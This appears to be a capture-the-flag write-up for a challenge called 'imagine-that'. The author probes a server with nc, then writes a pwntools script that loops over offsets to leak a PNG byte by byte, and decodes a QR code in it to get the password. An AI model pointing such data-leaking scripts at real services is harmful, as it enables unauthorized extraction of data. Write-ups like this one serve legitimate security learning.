# imagine-that

```bash
kali@kali:~/Desktop/imagine-that$ nc 34.107.72.222 31488
Enter starting point: a
a
Enter starting point: v
v
Traceback (most recent call last):
  File "server.py", line 9, in <module>
    if (int(end) - int(start) > 10):
ValueError: invalid literal for int() with base 10: 'v'
```
So start and end have to heve less that 10 diference.

```bash
kali@kali:~/Desktop/imagine-that$ nc 34.107.72.222 31488
Enter starting point: 1
1
Enter starting point: 10
10
�PNG
▒

Enter the password: 1
1
```
It looks like it leaks values from a PNG file, let's write something to get 'em.

It looks like it appends \x89 to the start of every sequence, but it is also in the magic bytes to PNG so we have to add it after.
I found on the Internet that socat transforms \n into \r\n

```python
#!/usr/bin/python3

from pwn import *
import sys

context.log_level = 'error'
context.log_console = sys.stderr # this is very important, otherwise the image would be corrupted

IP = '34.89.232.255'
port = 31488
def test():
    r = remote(IP, port)

    # enter starting point
    r.recvuntil('Enter starting point: ')
    data = bytes(str(3590), 'UTF-8')
    r.sendline(data)
    
    # enter starting point 2
    r.recvuntil("Enter starting point: ")
    data = bytes(str(3600), 'UTF-8')
    r.sendline(data)
    
    # get our number echoed back then the part from the file
    r.recvuntil('\x89', drop=True)
    data = r.recvuntil('\r\nEnter the password: ', drop=True)
    print(data)
def main():
    sys.stdout.buffer.write(b'\x89')
    for i in range(1, 3500):
        try:
            r = remote(IP, port)
        except:
            sleep(2)
            i = i-1
            continue
        

        # enter starting point
        r.recvuntil('Enter starting point: ')
        data = bytes(str(i), 'UTF-8')
        r.sendline(data)
        
        # enter starting point 2
        r.recvuntil("Enter starting point: ")
        data = bytes(str(i+1), 'UTF-8')
        r.sendline(data)
        
        # get our number echoed back then the part from the file
        r.recvuntil('\x89', drop=True)
        
        data = r.recvuntil('\r\nEnter the password: ', drop=True)
        if len(data) == 1:
            sys.stdout.buffer.write(data)
            sys.stdout.buffer.flush()
        else:
            sys.stdout.buffer.write(b'\n')
            sys.stdout.buffer.flush()
        r.close()


if __name__== "__main__":
    main()
```


```bash
kali@kali:~/Desktop/imagine-that$ zbarimg img.png 
QR-Code:asdsdgbrtvt4f5678k7v21ecxdzu7ib6453b3i76m65n4bvcx
scanned 1 barcode symbols from 1 images in 0.05 seconds
```
We get a password to put give to the server so that it gives us the flag.